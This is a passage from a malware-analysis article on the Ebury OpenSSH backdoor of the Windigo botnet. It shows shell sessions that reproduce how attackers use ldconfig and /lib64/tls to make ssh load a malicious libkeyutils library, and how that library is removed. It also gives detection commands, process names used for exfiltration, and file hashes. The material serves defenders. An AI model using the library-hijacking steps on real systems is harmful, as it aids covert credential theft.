			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Shell</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
# ldd /usr/bin/ssh | grep -i libkeyutils
  libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007ff67774f000)
# cp libkeyutils.so.1.5 /lib64/tls/
# ldd /usr/bin/ssh | grep -i libkeyutils
  libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f44ac6ba000)
# ldconfig
# ldd /usr/bin/ssh | grep -i libkeyutils
  libkeyutils.so.1 =&gt; /lib64/tls/libkeyutils.so.1 (0x00007fc12db23000)
# ls -al /lib64/tls
total 24
dr-xr-xr-x 1 root root  4096 Oct 18 14:34 .
dr-xr-xr-x 1 root root  4096 Oct 18 13:25 ..
lrwxrwxrwx 1 root root    18 Oct 18 14:34 libkeyutils.so.1 -&gt; libkeyutils.so.1.5
-rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803044748884845-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-2">2</div><div class="crayon-num" data-line="crayon-60581b9803044748884845-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-4">4</div><div class="crayon-num" data-line="crayon-60581b9803044748884845-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-6">6</div><div class="crayon-num" data-line="crayon-60581b9803044748884845-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-8">8</div><div class="crayon-num" data-line="crayon-60581b9803044748884845-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-10">10</div><div class="crayon-num" data-line="crayon-60581b9803044748884845-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-12">12</div><div class="crayon-num" data-line="crayon-60581b9803044748884845-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803044748884845-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803044748884845-1"># ldd /usr/bin/ssh | grep -i libkeyutils</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-2">&nbsp;&nbsp;libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007ff67774f000)</div><div class="crayon-line" id="crayon-60581b9803044748884845-3"># cp libkeyutils.so.1.5 /lib64/tls/</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-4"># ldd /usr/bin/ssh | grep -i libkeyutils</div><div class="crayon-line" id="crayon-60581b9803044748884845-5">&nbsp;&nbsp;libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f44ac6ba000)</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-6"># ldconfig</div><div class="crayon-line" id="crayon-60581b9803044748884845-7"># ldd /usr/bin/ssh | grep -i libkeyutils</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-8">&nbsp;&nbsp;libkeyutils.so.1 =&gt; /lib64/tls/libkeyutils.so.1 (0x00007fc12db23000)</div><div class="crayon-line" id="crayon-60581b9803044748884845-9"># ls -al /lib64/tls</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-10">total 24</div><div class="crayon-line" id="crayon-60581b9803044748884845-11">dr-xr-xr-x 1 root root&nbsp;&nbsp;4096 Oct 18 14:34 .</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-12">dr-xr-xr-x 1 root root&nbsp;&nbsp;4096 Oct 18 13:25 ..</div><div class="crayon-line" id="crayon-60581b9803044748884845-13">lrwxrwxrwx 1 root root&nbsp;&nbsp;&nbsp;&nbsp;18 Oct 18 14:34 libkeyutils.so.1 -&gt; libkeyutils.so.1.5</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803044748884845-14">-rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p><strong>Figure 14</strong>. Usage of <span style="font-family: 'courier new', courier, monospace">ldconfig</span> to deploy Ebury in <span style="font-family: 'courier new', courier, monospace">/lib64/tls/</span></p>
<p>Additionally, it makes for a simple uninstallation system that doesn’t require fiddling with symbolic links and keeping some backup copies of the original <span style="font-family: 'courier new', courier, monospace">libkeyutils</span> shared object in case something goes wrong during the deployment process. The only thing that is needed is to erase the malicious <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> file in the <span style="font-family: 'courier new', courier, monospace">/lib{,64}/tls/</span> folder, then run <span style="font-family: 'courier new', courier, monospace">ldconfig</span> again and the system is back to its original state.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803047316602249" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Shell</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
# ls -l /lib64/tls
total 16
lrwxrwxrwx 1 root root    18 Oct 18 14:34 libkeyutils.so.1 -&gt; libkeyutils.so.1.5
-rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5
# rm /lib64/tls/libkeyutils.so.1.5
# ldconfig
# ls -l /lib64/tls
total 0
# ldd /usr/bin/ssh | grep -i libkeyutils
  libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f7b89349000)
# ls -l /lib64/libkeyutils.so.1
lrwxrwxrwx 1 root root 18 Oct 18 13:25 /lib64/libkeyutils.so.1 -&gt; libkeyutils.so.1.5</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803047316602249-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803047316602249-2">2</div><div class="crayon-num" data-line="crayon-60581b9803047316602249-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803047316602249-4">4</div><div class="crayon-num" data-line="crayon-60581b9803047316602249-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803047316602249-6">6</div><div class="crayon-num" data-line="crayon-60581b9803047316602249-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803047316602249-8">8</div><div class="crayon-num" data-line="crayon-60581b9803047316602249-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803047316602249-10">10</div><div class="crayon-num" data-line="crayon-60581b9803047316602249-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803047316602249-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803047316602249-1"># ls -l /lib64/tls</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803047316602249-2">total 16</div><div class="crayon-line" id="crayon-60581b9803047316602249-3">lrwxrwxrwx 1 root root&nbsp;&nbsp;&nbsp;&nbsp;18 Oct 18 14:34 libkeyutils.so.1 -&gt; libkeyutils.so.1.5</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803047316602249-4">-rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5</div><div class="crayon-line" id="crayon-60581b9803047316602249-5"># rm /lib64/tls/libkeyutils.so.1.5</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803047316602249-6"># ldconfig</div><div class="crayon-line" id="crayon-60581b9803047316602249-7"># ls -l /lib64/tls</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803047316602249-8">total 0</div><div class="crayon-line" id="crayon-60581b9803047316602249-9"># ldd /usr/bin/ssh | grep -i libkeyutils</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803047316602249-10">&nbsp;&nbsp;libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f7b89349000)</div><div class="crayon-line" id="crayon-60581b9803047316602249-11"># ls -l /lib64/libkeyutils.so.1</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803047316602249-12">lrwxrwxrwx 1 root root 18 Oct 18 13:25 /lib64/libkeyutils.so.1 -&gt; libkeyutils.so.1.5</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p><strong>Figure 15</strong>. Usage of <span style="font-family: 'courier new', courier, monospace">ldconfig</span> to uninstall Ebury</p>
<p>The <span style="font-family: 'courier new', courier, monospace">tls</span> subdirectory is used together with a feature of the Linux loader where if the CPU supports some additional instruction set, the one in that directory takes precedence over the &#8220;regular&#8221; one. The <span style="font-family: 'courier new', courier, monospace">tls</span> directory is actually for a <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;h=99caf9e9bb9ff20eac07fc45b28c16d1958aec38;hb=HEAD#l1296" target="_blank" rel="noopener">pseudo-hwcap</a> for &#8220;TLS support&#8221; that is always present nowadays.</p>
<h2><strong>Conclusion</strong></h2>
<p>Even after the <a href="https://www.welivesecurity.com/2017/10/30/esets-research-fbi-windigo-maxim-senakh/" target="_blank" rel="noopener">arrest of Maxim Senakh</a>, the core of Windigo is still operational. Ebury, the main component of the Linux botnet, has gone through significant upgrades. It now uses self-hiding techniques and new ways to inject into OpenSSH related processes. Furthermore, it uses a new domain generation algorithm (DGA) to find which domain TXT record to fetch. The exfiltration server IP address is concealed in these data, signed with the attackers&#8217; private key. An expiration date was added to the signed data to defend against signature reuse, thus mitigating potential sinkhole attempts. Windigo’s operators regularly monitor publicly shared IoCs and quickly adapt to fool available indicators. Keep this is mind when trying to determine if a system is infected using public IoCs. The older they are, the more likely they are to be obsolete.</p>
<h3><strong>Indicators of Compromise (IoCs)</strong></h3>
<p>In this section, we share our IoCs that may help identify the latest variants of Ebury. We provide these to help the community detect if their systems are compromised but they are in no way to be considered perfect.</p>
<p>Ebury now uses an abstract UNIX socket to communicate with an external process that will be responsible for data exfiltration. In most cases, the socket name begins with &#8220;<span style="font-family: 'courier new', courier, monospace">/tmp/dbus-</span>&#8220;. The real <span style="font-family: 'courier new', courier, monospace">dbus</span> can create a socket using the same pattern. However, Ebury does this with processes not related to the legitimate <span style="font-family: 'courier new', courier, monospace">dbus</span>. If the following command outputs the socket, it is suspicious:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803048209961204" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Shell</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ lsof -U | grep -F @/tmp/dbus- | grep -v ^dbus</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803048209961204-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803048209961204-1">$ lsof -U | grep -F @/tmp/dbus- | grep -v ^dbus</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>Here’s a list of the processes we know Ebury uses as an exfiltration agent:</p>
<ul>
<li>auditd</li>
<li>crond</li>
<li>anacron</li>
<li>arpd</li>
<li>acpid</li>
<li>rsyslogd</li>
<li>udevd</li>
<li>systemd-udevd</li>
<li>atd</li>
<li>hostname</li>
<li>sync</li>
</ul>
<p>On CentOS/Redhat, having a <span style="font-family: 'courier new', courier, monospace">libkeyutils.so*</span> file in <span style="font-family: 'courier new', courier, monospace">/lib/tls/</span> or <span style="font-family: 'courier new', courier, monospace">/lib64/tls/</span> is suspicious.</p>
<p>Running <span style="font-family: 'courier new', courier, monospace">objdump -x libkeyutils.so.1</span> (or <span style="font-family: 'courier new', courier, monospace">readelf -d libkeyutils.so.1</span>) will print the dynamic section of the ELF header. Anything NEEDED (type 1) other than libc or libdl is suspicious.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b980304a994248083" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Shell</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ objdump -x /path/to/libkeyutils.so.1 | grep NEEDED | grep -v -F -e libdl.so -e libc.so</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b980304a994248083-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b980304a994248083-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-v">objdump</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">path</span><span class="crayon-o">/</span><span class="crayon-st">to</span><span class="crayon-o">/</span><span class="crayon-v">libkeyutils</span><span class="crayon-e">.so</span><span class="crayon-sy">.</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-r">grep</span><span class="crayon-h"> </span><span class="crayon-v">NEEDED</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-r">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">v</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">F</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-v">libdl</span><span class="crayon-e">.so</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-v">libc</span><span class="crayon-e">.so</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>In the event that your machine is infected with an Ebury version with the userland rootkit, there are many ways to detect that this is the case. Since Ebury injects itself using the dynamic linker <span style="font-family: 'courier new', courier, monospace">LD_PRELOAD</span> environment variable, we can use some other environment variable to trace the dynamic linking process. If <span style="font-family: 'courier new', courier, monospace">libkeyutils</span> is loaded in some process where it shouldn’t be, it is very likely that the system is infected with a rootkit-enabled version of Ebury. If the following command raises result, it is very suspicious:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b980304b698195639" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Shell</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ LD_DEBUG=symbols /bin/true 2&gt;&amp;1 | grep libkeyutils</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b980304b698195639-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b980304b698195639-1">$ LD_DEBUG=symbols /bin/true 2&gt;&amp;1 | grep libkeyutils</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>If you detect compromised machines, we strongly suggest doing a full system reinstallation because Windigo sometimes installs additional malware. Therefore, a machine compromised by Ebury is likely to be polluted by other threats. Additionally, consider <em>all</em> user credentials and <em>all</em> SSH keys to be compromised. Make sure to change them <strong>all</strong>.</p>

<table id="tablepress-431" class="tablepress tablepress-id-431">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><h3>Table 2. Ebury-related hashes</h3></th><th class="column-2">&nbsp;</th><th class="column-3">&nbsp;</th><th class="column-4">&nbsp;</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong>SHA-1</strong></td><td class="column-2"><strong>Filename</strong></td><td class="column-3"><strong>Version</strong></td><td class="column-4"><strong>Detection Name</strong></td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">5c796dc566647dd0db74d5934e768f4dfafec0e5</td><td class="column-2"><strong>libns2.so</strong></td><td class="column-3"><strong>1.5.0</strong></td><td class="column-4"><strong>Linux/Ebury.B</strong></td>
</tr>
<tr class="row-4 even">
	<td class="column-1">615c6b022b0fac1ff55c25b0b16eb734aed02734</td><td class="column-2"><strong>Unknown</strong></td><td class="column-3"><strong>1.5.1</strong></td><td class="column-4"><strong>Linux/Ebury.E</strong></td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">d4eeada3d10e76a5755c6913267135a925e195c6</td><td class="column-2"><strong>libns5.so</strong></td><td class="column-3"><strong>1.5.1c</strong></td><td class="column-4"><strong>Linux/Ebury.E</strong></td>
</tr>
<tr class="row-6 even">
	<td class="column-1">27ed035556abeeb98bc305930403a977b3cc2909</td><td class="column-2"><strong>libpw3.so</strong></td><td class="column-3"><strong>1.5.1d</strong></td><td class="column-4"><strong>Linux/Ebury.E</strong></td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">2f382e31f9ef3d418d31653ee124c0831b6c2273</td><td class="column-2"><strong>libpw5.so</strong></td><td class="column-3"><strong>1.5.1e</strong></td><td class="column-4"><strong>Linux/Ebury.E</strong></td>
</tr>
<tr class="row-8 even">
	<td class="column-1">7248e6eada8c70e7a468c0b6df2b50cf8c562bc9</td><td class="column-2"><strong>libpw5.so</strong></td><td class="column-3"><strong>1.5.1f</strong></td><td class="column-4"><strong>Linux/Ebury.I</strong></td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">e8d3c369a231552081b14076cf3eaa8901e6a1cd</td><td class="column-2"><strong>libkeyutils lib</strong></td><td class="column-3"><strong>1.5.5</strong></td><td class="column-4"><strong>Linux/Ebury.F</strong></td>
</tr>
<tr class="row-10 even">
	<td class="column-1">1d3aafce8cd33cf51b70558f33ec93c431a982ef</td><td class="column-2"><strong>libkeyutils lib</strong></td><td class="column-3"><strong>1.5.5</strong></td><td class="column-4"><strong>Linux/Ebury.F</strong></td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">a559ee8c2662ee8f3c73428eaf07d4359958cae1</td><td class="column-2"><strong>libkeyutils lib</strong></td><td class="column-3"><strong>1.5.5c</strong></td><td class="column-4"><strong>Linux/Ebury.F</strong></td>
</tr>
<tr class="row-12 even">
	<td class="column-1">17c40a5858a960afd19cc02e07d3a5e47b2ab97a</td><td class="column-2"><strong>libslr.so</strong></td><td class="column-3"><strong>1.5.6dp</strong></td><td class="column-4"><strong>Linux/Ebury.I</strong></td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">eb352686d1050b4ab289fe8f5b78f39e9c85fb55</td><td class="column-2"><strong>libkeyutils.so.1.5</strong></td><td class="column-3"><strong>1.5.6d</strong></td><td class="column-4"><strong>Linux/Ebury.F</strong></td>
</tr>
<tr class="row-14 even">
	<td class="column-1">44b340e90edba5b9f8cf7c2c01cb4d45dd25189e</td><td class="column-2"><strong>libkeyutils.so.1.5</strong></td><td class="column-3"><strong>1.6.2a</strong></td><td class="column-4"><strong>Linux/Ebury.I</strong></td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">e8d392ae654f62c6d44c00da517f6f4f33fe7fed</td><td class="column-2"><strong>libsbr.so</strong></td><td class="column-3"><strong>1.6.2gp</strong></td><td class="column-4"><strong>Linux/Ebury.I</strong></td>
</tr>
<tr class="row-16 even">
	<td class="column-1">b58725399531d38ca11d8651213b4483130c98e2</td><td class="column-2"><strong>libsbr.so</strong></td><td class="column-3"><strong>1.6.2gp</strong></td><td class="column-4"><strong>Linux/Ebury.I</strong></td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/fvachon/" title="Frédéric Vachon">
                    Frédéric Vachon                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2017-10-30 11:58:35">30 Oct 2017 - 11:58AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Windigo Still not Windigone: An Ebury Update">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Windigo Still not Windigone: An Ebury Update">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Windigo Still not Windigone: An Ebury Update">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
